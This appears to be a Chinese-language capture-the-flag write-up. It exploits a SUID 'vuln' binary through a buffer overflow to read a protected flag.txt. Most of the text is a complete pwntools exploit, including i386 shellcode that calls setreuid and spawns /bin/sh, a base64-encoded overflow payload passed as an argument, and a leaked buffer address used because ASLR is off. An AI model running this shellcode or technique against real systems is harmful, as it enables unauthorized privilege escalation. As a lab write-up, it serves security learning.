交互题目，先nc过去，发现就是一个命令行交互的终端

![image-20250602221551132](https://gitee.com/yigod/pictures/raw/master/imgs/image-20250602221551132.png)

直接cat flag.txt不可以

![image-20250602221633286](https://gitee.com/yigod/pictures/raw/master/imgs/image-20250602221633286.png)

查看文件权限

![image-20250602221702554](https://gitee.com/yigod/pictures/raw/master/imgs/image-20250602221702554.png)

发现vuln有suid ，以及flag.txt属于angel

考虑shellcode提权

例如下：

![f734143eb83eed7eb967e1055c6038b6](https://gitee.com/yigod/pictures/raw/master/imgs/f734143eb83eed7eb967e1055c6038b6.png)



逆向程序，发现vuln是命令行传参

![image-20250602221938136](https://gitee.com/yigod/pictures/raw/master/imgs/image-20250602221938136.png)

![image-20250602222121281](https://gitee.com/yigod/pictures/raw/master/imgs/image-20250602222121281.png)

溢出难度不大，但要考虑是命令行传参，所以用base64去实现

基址随机化是关闭了的，所以可用泄露的buf地址

![image-20250602222819342](https://gitee.com/yigod/pictures/raw/master/imgs/image-20250602222819342.png)

exp

```
from pwn import *
import time

# 远程连接配置
ip = ''
port = 

# ELF文件和目标缓冲区地址
#buf根据程序输出得到
buf = 

# shellcode
shellcode = (
    b'\x6a\x31\x58\x99\xcd\x80'                        # geteuid
    b'\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80'            # setreuid
    b'\xb0\x0b\x52\x68n/sh\x68//bi\x89\xe3\x89\xd1\xcd\x80'  # execve
)
# 构造参数 name 和 index
index = str(0x457)
name = p32(buf+4) + shellcode + b'a'*0x10
# 启动远程连接
p = remote(ip, port)
# 注意要进行 base64 编码或转义，因为 shellcode 中有不可见字符
import base64
name_encoded = base64.b64encode(name).decode()
payload = f'./vuln "$(echo {name_encoded} | base64 -d)" {index}'

# 发送payload
p.sendline(payload.encode())
p.sendline(b'cat flag.txt')  # 如果程序成功进入shell，执行cat命令
p.interactive()
```

